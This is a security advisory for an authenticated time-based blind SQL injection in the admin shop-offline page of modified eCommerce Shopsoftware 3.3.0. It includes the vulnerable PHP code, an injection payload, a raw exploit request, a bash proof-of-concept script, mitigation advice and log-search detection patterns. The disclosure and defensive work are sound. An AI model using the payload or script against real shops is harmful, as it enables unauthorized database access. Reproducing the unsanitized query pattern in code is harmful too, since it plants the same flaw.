# Security Advisory: SQL Injection (Time-Based Blind) in admin/shop_offline.php

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 7.2 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 is affected by a time-based blind SQL injection in `admin/shop_offline.php`. An authenticated administrator can inject SQL through the `customers_groups[]` POST array parameter. Array values are concatenated without sanitization into an UPDATE query's SET clause via string interpolation. The flaw allows full database compromise. No official fix is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/shop_offline.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

### Unaffected Products

- None evaluated.

---

## 3. Vulnerability Description

`shop_offline.php` manages which customer groups are allowed access when the shop is set to offline mode. The `customers_groups[]` POST array is iterated and each value is concatenated into a string `$group_ids`, which is then placed directly into a SQL UPDATE without passing through `xtc_db_input()`. Because the value is prefixed with `'c_'` and suffixed with `'_group ,'`, a single quote in the payload closes the string and allows arbitrary SQL injection into the UPDATE WHERE clause.

**Root cause:**

```php
// admin/shop_offline.php:38–46
$group_ids = '';
if (isset($_POST['customers_groups'])) {
    foreach ($_POST['customers_groups'] as $b) {
        $group_ids .= 'c_' . $b . "_group ,";   // ← $b not sanitized
    }
}
xtc_db_query("UPDATE shop_configuration
                 SET configuration_value='" . $group_ids . "'
               WHERE configuration_key='SHOP_OFFLINE_ALLOWED_CUSTOMERS_GROUPS'");
// Payload "x' WHERE 1=1 AND SLEEP(5)-- -" injected as $b produces:
// SET configuration_value='c_x' WHERE 1=1 AND SLEEP(5)-- -_group ,'
```

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** Valid admin session, CSRF token, and `go=1` POST field

---

## 4. Impact

- **Confidentiality:** High — full database read via blind injection
- **Integrity:** High — arbitrary UPDATE to shop_configuration; additional stacked queries possible
- **Availability:** High — heavy SLEEP/BENCHMARK queries can degrade database performance

---

## 5. Classification

### CVSS

- **Score:** 7.2
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

### CAPEC

- CAPEC-7: Blind SQL Injection

---

## 6. Exploitation Scenario

1. Attacker authenticates to the admin panel and obtains a session cookie and CSRF token.
2. Attacker sends a POST to `shop_offline.php` with `go=1` and a crafted `customers_groups[]` value containing a SQL fragment.
3. The injected fragment is embedded in the UPDATE query's WHERE clause via the `$group_ids` string.
4. Response timing reveals database contents via binary search using SLEEP-based conditions.
5. Note: MariaDB executes two additional SELECT queries via `xtc_get_shop_conf()` after the UPDATE, multiplying the observed delay by 3 (SLEEP(5) → ~20 seconds observed).

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/shop_offline.php (lines 38–46)
Parameter(s): customers_groups[] (POST array), go (POST)
Method: POST · Authentication: Admin required
```

### Example Request

```http
POST /admin/shop_offline.php HTTP/1.1
Host: TARGET
Cookie: MODsid=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<CSRF_NAME>=<CSRF_VALUE>&go=1&shop_offline=&customers_groups[]=x'+WHERE+1%3D1+AND+SLEEP(5)--+-
```

### Observed Response

```text
HTTP/1.1 200 OK
[Response time: ~20022ms — 3× SLEEP(5) = 15s + 2 extra SELECTs via xtc_get_shop_conf()]
```

### Result

Confirmed in authorized Docker lab. SLEEP(5) produces ~20 second delay due to the query being executed once in the UPDATE and twice more in subsequent SELECTs. Non-destructive test.

**Evidence:** 20022ms response time vs <100ms baseline.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V02 PoC — SQLi Time-Based Blind in shop_offline.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Get CSRF token
PAGE=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" "$TARGET/admin/shop_offline.php")
CSRF_NAME=$(echo "$PAGE" | grep -oP 'name="[A-Za-z0-9]{5,8}" value="[A-Za-z0-9]{30,40}"' | head -1 | grep -oP 'name="\K[^"]+')
CSRF_VALUE=$(echo "$PAGE" | grep -oP 'name="[A-Za-z0-9]{5,8}" value="[A-Za-z0-9]{30,40}"' | head -1 | grep -oP 'value="\K[^"]+')

# Step 2: Inject SLEEP(5) via customers_groups[]
START=$(date +%s%3N)
HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/shop_offline.php" \
  -d "${CSRF_NAME}=${CSRF_VALUE}&go=1&shop_offline=" \
  --data-urlencode "customers_groups[]=x' WHERE 1=1 AND SLEEP(5)-- -")
END=$(date +%s%3N)
echo "HTTP: $HTTP | Elapsed: $((END-START))ms"
# Expected: ~20000ms (SLEEP runs in UPDATE + 2× xtc_get_shop_conf SELECTs)
```

### Expected Result

```text
HTTP: 200 | Elapsed: ~20022ms
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Deploy authorized instance of modified eCommerce v3.3.0.
2. Log in as admin; navigate to Shop Offline settings to obtain CSRF token.
3. Send POST with `go=1`, valid CSRF, and `customers_groups[]=x' WHERE 1=1 AND SLEEP(5)-- -`.
4. Measure response time — expect ≥15 seconds.
5. Baseline (normal request with `customers_groups[]=1`) returns in <200ms.

---

## 10. Mitigation

- Sanitize all `customers_groups[]` values via `xtc_db_input()` before string concatenation.
- Replace string concatenation with parameterized statements.
- Restrict admin panel via IP/VPN.
- WAF rule: block SQL keywords (`SLEEP`, `UNION`, `--`) in POST body for admin endpoints.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// Vulnerable:
$group_ids .= 'c_'.$b."_group ,";

// Fixed:
$group_ids .= 'c_'.xtc_db_input($b)."_group ,";
// Or, better, validate that $b is numeric/alphanumeric before use:
if (ctype_alnum($b)) {
    $group_ids .= 'c_'.$b."_group ,";
}
```

---

## 12. Detection and Indicators

- POST to `/admin/shop_offline.php` with response time > 5 seconds.
- `customers_groups[]` values containing `'`, `--`, `SLEEP`, `UNION`.
- MySQL slow query log entries on `shop_configuration` UPDATE.

### Example Log Search

```text
grep "shop_offline.php" access.log | awk '$NF > 5000'
grep "SLEEP\|UNION" mysql-slow.log
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via static analysis |
| 16/11/2026 | Confirmed in authorized Docker lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |
| pending | Fix released |
| pending | Public advisory |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Date of first notification:** Pending
- **Response status:** Awaiting response
- **Vendor position:** N/A

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1
- CAPEC-7: https://capec.mitre.org/data/definitions/7.html

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes. The information was obtained in an authorized environment and disclosed responsibly.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
